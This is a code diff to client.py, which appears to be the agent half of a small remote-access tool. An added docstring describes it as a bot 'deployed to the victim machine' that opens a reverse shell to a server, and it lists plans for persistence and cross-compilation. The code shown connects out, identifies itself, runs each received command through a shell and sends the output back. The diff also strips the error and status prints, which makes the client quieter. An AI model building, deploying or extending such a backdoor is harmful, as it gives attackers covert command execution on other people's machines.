@@ -1,3 +1,22 @@
+"""
+
+Author: Sunggwan Choi 
+
+Description: Client.py is the bot agent that will be deployed to the victim 
+machine, and create a established reverse shell connection back to the 
+server.py. 
+
+client.py is barely finished.
+
+TODO: 
+    - Create a persistence mechaism built into the codebase.
+
+    - Bulid it in golang, for cross compilation 
+
+"""
+
+
+
 import socket
 import subprocess 
 import sys
@@ -18,12 +37,10 @@ try:
     sock.connect((host, port))
     sock.settimeout(None)
 except:
-    #print("[ERROR] Could not connect to server.") 
     sys.exit()
 
 id = "Edub07_c1i3nt"
 sock.send(id.encode())
-#print("[+] Connected with server: ", host)
 
 while True:
     # Receiving command, turning into string 
@@ -34,10 +51,9 @@ while True:
         
         try: 
             result = subprocess.check_output(command, shell=True)
-            #print(result.decode())
+
             sock.send(result)
         except Exception as err:
-            #print("Command failed.", err)
             continue
         
     elif not command:
